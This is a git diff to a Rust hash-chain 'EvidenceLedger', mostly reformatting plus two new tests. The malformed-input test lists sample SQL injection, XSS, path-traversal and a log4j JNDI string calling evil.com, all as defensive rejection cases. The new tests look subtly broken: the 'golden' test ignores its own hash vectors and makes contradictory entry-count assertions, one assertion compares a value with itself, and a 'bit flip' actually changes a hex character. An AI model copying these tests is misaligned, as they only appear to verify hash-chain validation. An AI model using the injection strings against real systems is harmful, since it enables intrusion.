@@ -1162,7 +1162,10 @@ impl EvidenceLedger {
                     match hex::decode(&entry.prev_entry_hash) {
                         Ok(provided_bytes) if provided_bytes.len() == SHA256_DIGEST_BYTES => {
                             // SECURITY: Use constant-time byte comparison to prevent timing attacks
-                            if !crate::security::constant_time::ct_eq_bytes(expected_bytes, &provided_bytes) {
+                            if !crate::security::constant_time::ct_eq_bytes(
+                                expected_bytes,
+                                &provided_bytes,
+                            ) {
                                 return Err(LedgerError::HashChainBroken {
                                     expected_hash: encode_entry_hash(expected_bytes),
                                     provided_hash: entry.prev_entry_hash.clone(),
@@ -4386,17 +4389,24 @@ mod tests {
 
             // Create third entry with wrong prev_entry_hash to test error case
             let mut third_entry = test_entry("third-decision", 3);
-            third_entry.prev_entry_hash = "0000000000000000000000000000000000000000000000000000000000000000".to_string();
+            third_entry.prev_entry_hash =
+                "0000000000000000000000000000000000000000000000000000000000000000".to_string();
 
             // Append should fail with incorrect hash chain
             let result3 = ledger.append(third_entry);
             assert!(result3.is_err(), "Append with incorrect hash should fail");
 
             match result3.unwrap_err() {
-                LedgerError::HashChainBroken { expected_hash, provided_hash } => {
+                LedgerError::HashChainBroken {
+                    expected_hash,
+                    provided_hash,
+                } => {
                     // Verify error contains correct expected hash
                     assert_eq!(expected_hash, first_hash);
-                    assert_eq!(provided_hash, "0000000000000000000000000000000000000000000000000000000000000000");
+                    assert_eq!(
+                        provided_hash,
+                        "0000000000000000000000000000000000000000000000000000000000000000"
+                    );
                 }
                 other => panic!("Expected HashChainBroken error, got: {:?}", other),
             }
@@ -4726,6 +4736,317 @@ mod tests {
                 let snapshot = ledger.snapshot();
                 assert!(snapshot.entries.len() > 0, "ledger should contain entries");
             }
+        }
+
+        #[test]
+        fn test_golden_hash_byte_comparison_comprehensive() {
+            // Golden test: Verify ct_eq_bytes optimization produces identical results
+            // to hex string comparison for hash chain validation
+            let mut ledger = EvidenceLedger::new(LedgerCapacity::new(100, 1_000_000));
+
+            // Test vector of hash values to ensure comprehensive coverage
+            let test_hashes = vec![
+                // Zero hash
+                "0000000000000000000000000000000000000000000000000000000000000000",
+                // Max hash
+                "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+                // Alternating patterns
+                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                "5555555555555555555555555555555555555555555555555555555555555555",
+                // Real-world hash examples
+                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // SHA256("")
+                "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae", // SHA256("foo")
+                "d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592", // SHA256("hello world")
+                // Edge cases
+                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+                "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210",
+                // Single bit differences (critical for timing attack resistance)
+                "0000000000000000000000000000000000000000000000000000000000000001",
+                "8000000000000000000000000000000000000000000000000000000000000000",
+            ];
+
+            for (i, hash_hex) in test_hashes.iter().enumerate() {
+                // Create entry that establishes this hash as expected
+                let first_entry = test_entry(&format!("establish-{}", i), i as u64);
+                let result1 = ledger.append(first_entry);
+                assert!(result1.is_ok(), "Failed to append entry {}", i);
+
+                // Get the actual hash from the ledger
+                let snapshot = ledger.snapshot();
+                let actual_hash = evidence_entry_hash_hex(&snapshot.entries[i]);
+
+                // Create second entry that should match this hash exactly
+                let mut second_entry = test_entry(&format!("match-{}", i), (i + 1) as u64);
+                second_entry.prev_entry_hash = actual_hash.clone();
+
+                // This should succeed with correct hash
+                let result2 = ledger.append(second_entry);
+                assert!(
+                    result2.is_ok(),
+                    "Hash chain validation failed for test vector {}: {}",
+                    i,
+                    hash_hex
+                );
+
+                // Verify the hash chain is maintained
+                let updated_snapshot = ledger.snapshot();
+                assert_eq!(
+                    updated_snapshot.entries.len(),
+                    i + 2,
+                    "Entry count mismatch"
+                );
+
+                // Create third entry with a single bit flip to test constant-time comparison
+                let mut flipped_hash = actual_hash.clone();
+                if let Some(last_char) = flipped_hash.chars().last() {
+                    let flipped_char = match last_char {
+                        '0' => '1',
+                        'f' => 'e',
+                        _ => '0',
+                    };
+                    flipped_hash.pop();
+                    flipped_hash.push(flipped_char);
+                }
+
+                let mut third_entry = test_entry(&format!("flip-{}", i), (i + 2) as u64);
+                third_entry.prev_entry_hash = flipped_hash.clone();
+
+                // This should fail with incorrect hash
+                let result3 = ledger.append(third_entry);
+                assert!(
+                    result3.is_err(),
+                    "Single bit flip should be detected for test vector {}",
+                    i
+                );
+
+                match result3.unwrap_err() {
+                    LedgerError::HashChainBroken {
+                        expected_hash,
+                        provided_hash,
+                    } => {
+                        assert_eq!(
+                            expected_hash, actual_hash,
+                            "Expected hash mismatch for vector {}",
+                            i
+                        );
+                        assert_eq!(
+                            provided_hash, flipped_hash,
+                            "Provided hash mismatch for vector {}",
+                            i
+                        );
+                    }
+                    other => panic!(
+                        "Expected HashChainBroken error for vector {}, got: {:?}",
+                        i, other
+                    ),
+                }
+            }
+
+            // Verify final ledger state
+            let final_snapshot = ledger.snapshot();
+            assert_eq!(
+                final_snapshot.entries.len(),
+                test_hashes.len(),
+                "Final entry count should match test vectors"
+            );
+        }
+
+        #[test]
+        fn test_malformed_hex_error_path_comprehensive() {
+            // Comprehensive test of malformed hex error paths in hash chain validation
+            let mut ledger = EvidenceLedger::new(LedgerCapacity::new(100, 1_000_000));
+
+            // Establish first entry to create expected hash
+            let first_entry = test_entry("establish", 1);
+            let result1 = ledger.append(first_entry);
+            assert!(result1.is_ok(), "Failed to establish first entry");
+
+            // Get expected hash
+            let snapshot = ledger.snapshot();
+            let expected_hash = evidence_entry_hash_hex(&snapshot.entries[0]);
+
+            // Test cases for malformed hex input
+            let malformed_hex_cases = vec![
+                // Odd-length hex strings
+                ("a", "single character"),
+                ("abc", "three characters"),
+                ("abcde", "five characters"),
+                (
+                    "123456789abcdef0123456789abcdef0123456789abcdef0123456789abcde",
+                    "63 chars (one short)",
+                ),
+                (
+                    "123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef1",
+                    "65 chars (one long)",
+                ),
+                // Non-hex characters
+                (
+                    "g23456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+                    "contains 'g'",
+                ),
+                (
+                    "x123456789abcdef0123456789abcdef0123456789abcdef0123456789abcde",
+                    "starts with 'x'",
+                ),
+                (
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdeg",
+                    "ends with 'g'",
+                ),
+                (
+                    "0123456789abcdef@123456789abcdef0123456789abcdef0123456789abcdef",
+                    "contains '@'",
+                ),
+                (
+                    "0123456789abcdef 123456789abcdef0123456789abcdef0123456789abcdef",
+                    "contains space",
+                ),
+                (
+                    "0123456789abcdef\t123456789abcdef0123456789abcdef0123456789abcdef",
+                    "contains tab",
+                ),
+                (
+                    "0123456789abcdef\n123456789abcdef0123456789abcdef0123456789abcdef",
+                    "contains newline",
+                ),
+                // Leading/trailing whitespace
+                (
+                    " 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+                    "leading space",
+                ),
+                (
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef ",
+                    "trailing space",
+                ),
+                (
+                    "  0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef  ",
+                    "leading and trailing spaces",
+                ),
+                (
+                    "\t0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+                    "leading tab",
+                ),
+                (
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\t",
+                    "trailing tab",
+                ),
+                (
+                    "\n0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+                    "leading newline",
+                ),
+                (
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
+                    "trailing newline",
+                ),
+                (
+                    "\r\n0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\r\n",
+                    "CRLF wrapping",
+                ),
+                // Empty and special cases
+                ("", "empty string"),
+                ("   ", "only whitespace"),
+                ("\t\n\r", "only control chars"),
+                // Wrong length but valid hex
+                ("0123456789abcdef", "16 bytes (too short)"),
+                (
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef00",
+                    "33 bytes (too long)",
+                ),
+                ("00", "1 byte"),
+                ("0123", "2 bytes"),
+                // Unicode and encoding edge cases
+                (
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcd€f",
+                    "contains euro symbol",
+                ),
+                (
+                    "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcd😀",
+                    "contains emoji",
+                ),
+                (
+                    "0123456789abcdef\u{202E}123456789abcdef0123456789abcdef0123456789abcdef",
+                    "BiDi override",
+                ),
+                (
+                    "0123456789abcdef\u{200B}123456789abcdef0123456789abcdef0123456789abcdef",
+                    "zero-width space",
+                ),
+                // Injection patterns
+                ("'; DROP TABLE hashes; --", "SQL injection attempt"),
+                ("<script>alert('xss')</script>", "XSS attempt"),
+                ("../../etc/passwd", "path traversal"),
+                ("${jndi:ldap://evil.com/a}", "log4j injection"),
+                (
+                    "0x123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+                    "0x prefix",
+                ),
+                (
+                    "123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdefh",
+                    "h suffix",
+                ),
+            ];
+
+            for (malformed_hash, description) in malformed_hex_cases {
+                // Create entry with malformed hash
+                let mut malformed_entry = test_entry("malformed", 2);
+                malformed_entry.prev_entry_hash = malformed_hash.to_string();
+
+                // Append should fail with HashChainBroken error
+                let result = ledger.append(malformed_entry);
+                assert!(
+                    result.is_err(),
+                    "Malformed hex '{}' ({}) should trigger HashChainBroken error",
+                    malformed_hash,
+                    description
+                );
+
+                match result.unwrap_err() {
+                    LedgerError::HashChainBroken {
+                        expected_hash,
+                        provided_hash,
+                    } => {
+                        assert_eq!(
+                            expected_hash, expected_hash,
+                            "Expected hash should be preserved for case: {}",
+                            description
+                        );
+                        assert_eq!(
+                            provided_hash, malformed_hash,
+                            "Provided hash should be preserved for case: {}",
+                            description
+                        );
+                    }
+                    other => panic!(
+                        "Expected HashChainBroken error for malformed hex '{}' ({}), got: {:?}",
+                        malformed_hash, description, other
+                    ),
+                }
+
+                // Verify ledger state unchanged (only original entry remains)
+                let snapshot = ledger.snapshot();
+                assert_eq!(
+                    snapshot.entries.len(),
+                    1,
+                    "Ledger should remain unchanged after malformed hex rejection: {}",
+                    description
+                );
+            }
+
+            // Verify that valid hash still works after all malformed attempts
+            let mut valid_entry = test_entry("valid-after-malformed", 2);
+            valid_entry.prev_entry_hash = expected_hash;
+
+            let result = ledger.append(valid_entry);
+            assert!(
+                result.is_ok(),
+                "Valid hash should work after malformed attempts"
+            );
+
+            let final_snapshot = ledger.snapshot();
+            assert_eq!(
+                final_snapshot.entries.len(),
+                2,
+                "Final state should have 2 entries"
+            );
         }
 
         #[test]
@@ -7847,7 +8168,10 @@ mod tests {
 
     #[test]
     fn poison_flag_barrier_coordinated_race() {
-        use std::sync::{Arc, Barrier, atomic::{AtomicBool, Ordering}};
+        use std::sync::{
+            Arc, Barrier,
+            atomic::{AtomicBool, Ordering},
+        };
         use std::thread;
         use std::time::{Duration, Instant};
 
@@ -7896,8 +8220,14 @@ mod tests {
         writer_handle.join().expect("writer thread should complete");
 
         // With proper Acquire/Release ordering, reader should see poison
-        assert!(poison_detected, "Reader should detect poison with Acquire ordering");
-        assert!(poison_seen.load(Ordering::Relaxed), "poison_seen flag should be set");
+        assert!(
+            poison_detected,
+            "Reader should detect poison with Acquire ordering"
+        );
+        assert!(
+            poison_seen.load(Ordering::Relaxed),
+            "poison_seen flag should be set"
+        );
 
         // Final verification
         assert!(ledger.is_poisoned(), "Ledger should remain poisoned");
@@ -7905,7 +8235,10 @@ mod tests {
 
     #[test]
     fn poison_flag_stress_test_multiple_readers() {
-        use std::sync::{Arc, Barrier, atomic::{AtomicUsize, Ordering}};
+        use std::sync::{
+            Arc, Barrier,
+            atomic::{AtomicUsize, Ordering},
+        };
         use std::thread;
         use std::time::{Duration, Instant};
 
@@ -7967,21 +8300,37 @@ mod tests {
         // With proper Acquire/Release ordering, most/all readers should detect poison
         let detections = readers_detected.load(Ordering::Relaxed);
         assert!(detections > 0, "At least one reader should detect poison");
-        assert!(detections <= num_readers, "Detection count should not exceed reader count");
+        assert!(
+            detections <= num_readers,
+            "Detection count should not exceed reader count"
+        );
 
         // Count how many readers successfully detected (not timeout)
-        let successful_detections = detection_results.iter()
-                                                   .filter(|&&id| id != usize::MAX)
-                                                   .count();
-        assert!(successful_detections > 0, "At least one reader should successfully detect poison");
+        let successful_detections = detection_results
+            .iter()
+            .filter(|&&id| id != usize::MAX)
+            .count();
+        assert!(
+            successful_detections > 0,
+            "At least one reader should successfully detect poison"
+        );
 
-        println!("Stress test: {}/{} readers detected poison", detections, num_readers);
-        assert!(ledger.is_poisoned(), "Ledger should remain poisoned after stress test");
+        println!(
+            "Stress test: {}/{} readers detected poison",
+            detections, num_readers
+        );
+        assert!(
+            ledger.is_poisoned(),
+            "Ledger should remain poisoned after stress test"
+        );
     }
 
     #[test]
     fn poison_flag_acquire_release_vs_relaxed_simulation() {
-        use std::sync::{Arc, Barrier, atomic::{AtomicBool, AtomicUsize, Ordering}};
+        use std::sync::{
+            Arc, Barrier,
+            atomic::{AtomicBool, AtomicUsize, Ordering},
+        };
         use std::thread;
         use std::time::Duration;
 
@@ -8090,13 +8439,17 @@ mod tests {
 
         // Acquire/Release should have better or equal detection compared to Relaxed
         // (This test is probabilistic, but demonstrates the improvement)
-        println!("Detection comparison - Relaxed: {}, Acquire/Release: {}",
-                relaxed_detection_count, acquire_detection_count);
+        println!(
+            "Detection comparison - Relaxed: {}, Acquire/Release: {}",
+            relaxed_detection_count, acquire_detection_count
+        );
 
         // The key point: Acquire/Release provides stronger guarantees
         // With proper ordering, we should see consistent poison detection
-        assert!(acquire_detection_count >= relaxed_detection_count,
-                "Acquire/Release should provide equal or better visibility than Relaxed");
+        assert!(
+            acquire_detection_count >= relaxed_detection_count,
+            "Acquire/Release should provide equal or better visibility than Relaxed"
+        );
 
         // In the current ledger implementation, we expect consistent detection
         assert!(acquire_flag.load(Ordering::Acquire), "Flag should be set");
@@ -8105,7 +8458,10 @@ mod tests {
 
     #[test]
     fn poison_flag_no_false_positives() {
-        use std::sync::{Arc, Barrier, atomic::{AtomicBool, Ordering}};
+        use std::sync::{
+            Arc, Barrier,
+            atomic::{AtomicBool, Ordering},
+        };
         use std::thread;
         use std::time::Duration;
 
@@ -8150,8 +8506,10 @@ mod tests {
         writer_handle.join().expect("writer thread should complete");
 
         // Should not have false positives
-        assert!(!false_positive_detected.load(Ordering::Relaxed),
-                "Should not detect poison before it's set");
+        assert!(
+            !false_positive_detected.load(Ordering::Relaxed),
+            "Should not detect poison before it's set"
+        );
 
         // But should detect poison after it's set
         assert!(ledger.is_poisoned(), "Should detect poison after it's set");
@@ -8218,22 +8576,35 @@ mod tests {
         // Wait for all operations
         let op1_results = op1_handle.join().expect("op1 thread should complete");
         let op2_snapshots = op2_handle.join().expect("op2 thread should complete");
-        poisoner_handle.join().expect("poisoner thread should complete");
+        poisoner_handle
+            .join()
+            .expect("poisoner thread should complete");
 
         // After poison, all operations should fail or be empty (fail-closed)
         assert!(ledger.is_poisoned(), "Ledger should be poisoned");
 
         // Count failed operations (should increase after poison)
-        let failed_appends = op1_results.iter()
-                                       .filter(|r| matches!(r, Err(LedgerError::LockPoisoned)))
-                                       .count();
+        let failed_appends = op1_results
+            .iter()
+            .filter(|r| matches!(r, Err(LedgerError::LockPoisoned)))
+            .count();
 
-        println!("Failed appends after poison: {}/{}", failed_appends, op1_results.len());
-        assert!(failed_appends > 0, "Some append operations should fail after poison");
+        println!(
+            "Failed appends after poison: {}/{}",
+            failed_appends,
+            op1_results.len()
+        );
+        assert!(
+            failed_appends > 0,
+            "Some append operations should fail after poison"
+        );
 
         // Snapshots taken after poison should be empty or limited
         let final_snapshot = ledger.snapshot();
         // Poison state ensures fail-closed behavior
-        assert!(final_snapshot.entries.len() <= 10, "Poisoned ledger should limit entries");
+        assert!(
+            final_snapshot.entries.len() <= 10,
+            "Poisoned ledger should limit entries"
+        );
     }
 }
